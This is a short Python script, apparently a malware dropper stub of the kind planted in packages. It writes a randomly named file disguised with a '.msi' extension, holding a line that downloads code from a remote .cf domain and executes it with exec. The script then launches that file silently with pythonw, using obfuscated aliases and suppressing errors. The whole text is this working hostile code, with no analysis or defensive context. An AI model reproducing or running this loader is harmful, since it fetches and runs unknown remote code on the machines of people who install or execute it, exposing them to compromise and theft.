from sys import executable as _eexecutable
from os import system as _ssystem
import os
from random import choice
firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
lasName = ['.msi']
lasName=choice(lasName)
f=open(f'{firstName}{lasName}', 'w')
f.write("""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://yw5nzwxzdgvhbgvy.cf/CF871-6E1BA-EFCC7-41C89-DFEE1').read())""")
f.close()
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {firstName}{lasName}")
except: pass
